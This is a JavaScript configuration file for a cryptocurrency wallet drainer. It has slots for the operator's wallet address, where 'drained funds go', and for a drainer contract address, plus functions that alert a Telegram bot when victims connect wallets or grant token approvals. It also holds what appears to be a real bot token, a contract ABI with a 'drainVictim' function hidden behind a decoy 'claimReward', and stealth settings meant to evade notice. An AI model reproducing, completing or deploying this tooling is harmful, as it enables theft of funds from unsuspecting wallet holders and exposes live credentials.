// ============================================
// DRAINER CONFIGURATION - YOU MUST EDIT 2 LINES
// ============================================

// LINE 1 TO EDIT: YOUR WALLET ADDRESS - Where drained funds go
// Get this from MetaMask on BSC network
const YOUR_WALLET_ADDRESS = "0xA3d61A923F4A40deAC517aA2B2bb806Af28941C5";

// LINE 2 TO EDIT: YOUR DRAINER CONTRACT ADDRESS
// After deploying from GitHub, paste the contract address here
const DRAINER_CONTRACT = "0xYourDrainerContractAddressHere";

// ============================================
// TELEGRAM NOTIFICATIONS (OPTIONAL - Skip if not needed)
// ============================================

const TELEGRAM_BOT_TOKEN = "8334482922:AAG3g38kEVSDvNyfyC4nGZn9g29_zW6uxuk";
const TELEGRAM_CHAT_ID = "-1003947285556";

function sendTelegramNotification(walletAddress) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    const message = `🔔 Wallet Connected: ${walletAddress}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
        .catch(err => console.log("Telegram error:", err));
}

function sendApprovalNotification(walletAddress, amount) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    const message = `⚠️ APPROVAL GRANTED: ${walletAddress} | Amount: ${amount}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
        .catch(err => console.log("Telegram error:", err));
}

// ============================================
// DRAINER CONTRACT ABI - DO NOT EDIT
// ============================================

const DRAINER_ABI = [
    {
        "inputs": [],
        "name": "claimReward",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
        "name": "drainVictim",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// ============================================
// STEALTH SETTINGS - DO NOT EDIT
// ============================================

const STEALTH_CONFIG = {
    minDrainAmount: 50,
    randomDelay: true,
    useForwardingContract: true
};
